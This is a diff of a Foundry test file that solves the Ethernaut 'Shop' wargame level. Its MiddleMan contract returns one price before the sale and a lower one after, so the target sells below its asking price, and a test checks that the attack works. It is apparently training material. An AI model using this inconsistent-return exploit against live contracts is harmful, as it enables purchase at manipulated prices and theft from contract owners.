@@ -4,29 +4,18 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Shop.sol";
 
-// return price() differently
 contract MiddleMan is Buyer {
-    bool public counter;
-    Shop prey;
-
-    constructor(address preyAddr) {
-        prey = Shop(preyAddr);
-    }
-
-    // note that the interface of Buyer.price() is view and can thus not modify state
+    // Buyer.price() is a view function, thus using isSold as the condition
     function price() external view returns (uint256) {
-        if (prey.isSold()) {
-            return 0;
-        } else {
-            return 100;
-        }
+        return Shop(msg.sender).isSold() ? 0 : Shop(msg.sender).price();
     }
 
-    function attack() public {
-        prey.buy();
+    function attack(address prey) public {
+        Shop(prey).buy();
     }
 }
 
+// return price() differently
 contract ShopTest is Test {
     Shop instance;
 
@@ -35,13 +24,14 @@ contract ShopTest is Test {
     }
 
     function test() public {
+        uint256 initialPrice = 100;
+        assertEq(instance.price(), initialPrice);
         assertEq(instance.isSold(), false);
-        assertEq(instance.price(), 100);
 
-        MiddleMan middleMan = new MiddleMan(address(instance));
-        middleMan.attack();
+        MiddleMan middleMan = new MiddleMan();
+        middleMan.attack(address(instance));
 
+        assertTrue(instance.price() < initialPrice);
         assertEq(instance.isSold(), true);
-        assertEq(instance.price(), 0);
     }
 }
